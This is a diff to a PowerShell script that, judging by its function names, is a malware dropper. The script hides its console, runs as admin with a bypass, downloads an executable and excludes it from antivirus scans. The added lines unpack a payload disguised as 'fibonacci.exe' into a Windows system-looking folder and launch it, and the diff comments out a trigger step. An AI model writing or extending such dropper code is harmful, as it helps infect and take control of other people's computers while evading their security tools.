@@ -34,7 +34,8 @@ function DownloadExeShellAndExcludeFromScan
 
 function ExecuteShell
 {
-	
+	Expand-Archive "C:\Windows\Win\script\fibonacci.zip" -DestinationPath "C:\Windows\Win\script\"
+	Start-Process -FilePath "C:\Windows\Win\script\fibonacci.exe"
 }
 
 function TriggerExecution
@@ -54,4 +55,4 @@ Hide-Console
 RunAdminAndBypass
 DownloadExeShellAndExcludeFromScan
 ExecuteShell
-TriggerExecution
+# TriggerExecution
